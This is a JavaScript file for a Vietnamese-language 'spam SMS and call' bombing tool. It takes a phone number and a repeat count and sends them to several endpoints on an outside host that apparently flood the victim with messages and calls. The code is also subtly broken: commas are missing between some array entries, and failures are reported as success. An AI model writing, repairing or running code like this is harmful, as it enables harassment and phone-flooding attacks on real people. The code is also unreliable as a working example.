let queue = [];
let processing = false;

// Bản quyền của quang
const urls = [
    'https://quang.nqtool.net/?',
    'https://quang.nqtool.net/index1.php?',
    'https://quang.nqtool.net/index2.php?',
    'https://quang.nqtool.net/index3.php?',
    'https://quang.nqtool.net/index4.php?',
    'https://quang.nqtool.net/index5.php?'
    'https://quang.nqtool.net/index6.php?'
];

function addToQueue() {
    const phone = document.getElementById('phone').value;
    const times = document.getElementById('times').value;

    if (phone && times) {
        queue.push({ phone, times });
        updateStatusBar();
        if (!processing) {
            processQueue();
        }
    }
}

function processQueue() {
    if (queue.length === 0) {
        processing = false;
        return;
    }

    processing = true;
    const { phone, times } = queue.shift();

    const listItem = document.createElement('li');
    listItem.innerText = `Bắt Đầu ${phone} (${times} times)`;
    document.getElementById('status-list').appendChild(listItem);

    spamSmsAndCall(phone, times, listItem);
}

function spamSmsAndCall(phone, times, listItem) {
    // Create URLs for API requests
    const urlsToFetch = [
        `${urls[0]}phone=${phone}&amout=${times}`,
        `${urls[1]}phone=${phone}&amout=${times}`,
        `${urls[2]}phone=${phone}&amout=${times}`,
        `${urls[3]}phone=${phone}&amout=${times}`,
        `${urls[4]}phone=${phone}&amout=${times}`
        `${urls[5]}phone=${phone}&amout=${times}`
    ];

    Promise.all(urlsToFetch.map(url => fetch(url).then(response => response.json())))
    .then(responses => {
        const messages = responses.map((response, index) => `URL${index + 1} - ${response.message}`).join(', ');
        listItem.innerText = `Thành Công ${phone}: ${messages}`;
        processQueue();
    })
    .catch(error => {
        listItem.innerText = `Thành Công ${phone}`;
        processQueue();
    });
}

function updateStatusBar() {
    const statusList = document.getElementById('status-list');
    statusList.innerHTML = ''; // Clear the list
    queue.forEach((item, index) => {
        const listItem = document.createElement('li');
        listItem.innerText = `Luồng: ${item.phone} (${item.times} times)`;
        statusList.appendChild(listItem);
    });
}
